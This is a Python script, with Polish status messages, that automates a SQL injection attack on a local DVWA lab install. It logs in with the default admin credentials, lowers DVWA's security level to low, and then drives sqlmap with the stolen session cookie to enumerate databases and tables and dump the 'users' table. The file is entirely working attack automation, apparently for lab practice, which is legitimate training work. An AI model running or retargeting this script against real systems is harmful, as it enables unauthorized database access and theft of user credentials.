import requests
from bs4 import BeautifulSoup
import subprocess

LOGIN_URL = "http://localhost/DVWA/login.php"
SECURITY_URL = "http://localhost/DVWA/security.php"
VULN_URL = "http://localhost/DVWA/vulnerabilities/sqli/"
USERNAME = "admin"
PASSWORD = "password"

session = requests.Session()

def login():
    print("[*] Logowanie do DVWA...")
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    session.post(LOGIN_URL, data=payload)
    print(f"[+] Zalogowano na DVWA z danymi: {USERNAME} / {PASSWORD}")

def set_security_low():
    print("[*] Ustawianie poziomu zabezpieczeń na LOW...")
    r = session.get(SECURITY_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }

    r = session.post(SECURITY_URL, data=payload)
    if "Security level set to low" in r.text:
        print("[+] Poziom zabezpieczeń ustawiony na LOW.")
    else:
        print("[-] Nie udało się ustawić poziomu zabezpieczeń.")

def run_sqlmap():
    print("[*] Rozpoczynam atak SQL Injection za pomocą sqlmap...")

    phpsessid = session.cookies.get("PHPSESSID")
    if not phpsessid:
        print("[-] Nie udało się pobrać PHPSESSID.")
        return

    cookie = f"security=low; PHPSESSID={phpsessid}"

    list_db_cmd = [
        "sqlmap",
        "-u", VULN_URL + "?id=1&Submit=Submit",
        "--cookie", cookie,
        "--batch",
        "--dbs"
    ]
    print(f"\n[+] Pobieranie listy baz danych...")
    subprocess.run(list_db_cmd)

    list_tables_cmd = [
        "sqlmap",
        "-u", VULN_URL + "?id=1&Submit=Submit",
        "--cookie", cookie,
        "--batch",
        "-D", "dvwa",
        "--tables"
    ]
    print(f"\n[+] Pobieranie tabel z bazy danych 'dvwa'...")
    subprocess.run(list_tables_cmd)

    dump_cmd = [
        "sqlmap",
        "-u", VULN_URL + "?id=1&Submit=Submit",
        "--cookie", cookie,
        "--batch",
        "-D", "dvwa",
        "-T", "users",
        "--dump"
    ]
    print(f"\n[+] Zrzut danych z tabeli 'users'...")
    subprocess.run(dump_cmd)

if __name__ == "__main__":
    login()
    set_security_low()
    run_sqlmap()